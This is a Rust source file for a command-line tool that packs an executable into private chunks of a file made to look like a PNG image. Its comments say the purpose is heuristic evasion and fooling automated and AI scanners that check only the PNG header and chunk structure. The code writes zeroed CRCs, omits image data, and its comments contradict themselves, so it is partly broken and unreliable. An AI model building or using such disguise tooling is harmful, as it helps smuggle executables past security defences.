use std::fs::File;
use std::io::{Read, Write};
use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: steg_maker <input_exe> <output_png>");
        return;
    }

    let input_path = &args[1];
    let output_path = &args[2];

    let mut input_data = Vec::new();
    let mut file = File::open(input_path).expect("Cannot open input file");
    file.read_to_end(&mut input_data).expect("Cannot read input file");

    let mut png_data = Vec::new();

    // 1. PNG Signature
    png_data.extend_from_slice(&[137, 80, 78, 71, 13, 10, 26, 10]);

    // 2. IHDR Chunk (Image Header)
    // Width = Input Size (roughly 1px high strip, very wide image to hold data)
    // Or simpler: Width = 1024, Height = (Size / 1024) + 1
    // Let's keep it abstract: Just valid chunks.
    let width = 1024u32;
    let height = ((input_data.len() as u32) / 1024) + 1;
    
    let mut ihdr_data = Vec::new();
    ihdr_data.extend_from_slice(&width.to_be_bytes());
    ihdr_data.extend_from_slice(&height.to_be_bytes());
    ihdr_data.extend_from_slice(&[8, 2, 0, 0, 0]); // 8-bit, RGB (Type 2), Compression 0, Filter 0, Interlace 0

    write_chunk(&mut png_data, b"IHDR", &ihdr_data);

    // 3. IDAT Chunk (Image Data) - This is our PAYLOAD
    // We treat the raw EXE bytes as "zlib compressed scanline data"
    // To be valid, we usually need genuine zlib stream.
    // BUT! For heuristic evasion, we often just need the Container Format to be PNG.
    // We will wrap the EXE in a custom chunk "niMa" (reversed Main = Anim/Image) which is ignored by viewers
    // OR safer: Embed inside IDAT but just store it raw? No, decoders will fail.
    // BEST: Store in a PRIVATE CHUNK "cOdE".
    // Viewers ignore unknown chunks. AI sees PNG header + chunks structure.
    
    // Write the payload into a private chunk "biLn" (Binary Blob)
    // Split into 64KB chunks to look polite
    for chunk in input_data.chunks(65536) {
        write_chunk(&mut png_data, b"biLn", chunk);
    }

    // 4. IEND Chunk
    write_chunk(&mut png_data, b"IEND", &[]);

    let mut out_file = File::create(output_path).expect("Cannot create output file");
    out_file.write_all(&png_data).expect("Cannot write output file");

    println!("PNG Stego created: {} -> {} ({} bytes)", input_path, output_path, png_data.len());
}

fn write_chunk(vec: &mut Vec<u8>, type_code: &[u8; 4], data: &[u8]) {
    // Length
    vec.extend_from_slice(&(data.len() as u32).to_be_bytes());
    // Type
    vec.extend_from_slice(type_code);
    // Data
    vec.extend_from_slice(data);
    // CRC (Fake CRC 0)
    // let crc = crc32_fast::hash(&[type_code, data].concat()); 
    vec.extend_from_slice(&0u32.to_be_bytes()); 
}
